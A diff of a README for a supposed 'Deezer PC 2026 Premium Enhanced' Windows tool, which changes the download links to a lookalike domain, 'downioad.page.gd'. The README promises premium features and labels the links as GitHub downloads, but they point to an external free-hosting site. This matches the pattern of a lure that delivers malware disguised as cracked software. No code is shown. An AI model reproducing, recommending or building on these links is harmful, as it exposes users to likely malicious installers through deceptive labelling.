@@ -2,7 +2,7 @@
 
 Deezer PC 2026 Premium Enhanced Desktop Tool is a comprehensive utility designed to elevate your Deezer experience on Windows. It offers a range of features for music enthusiasts who want a seamless and enhanced desktop application. With this tool, you can enjoy music streaming with added benefits and improved controls.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Features
 
@@ -62,7 +62,7 @@ Updates are typically notified within the tool or through the download page. You
 ## Download
 
 To get the latest version of Deezer PC 2026 Premium Enhanced Desktop Tool, please visit the following link:
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Disclaimer
 
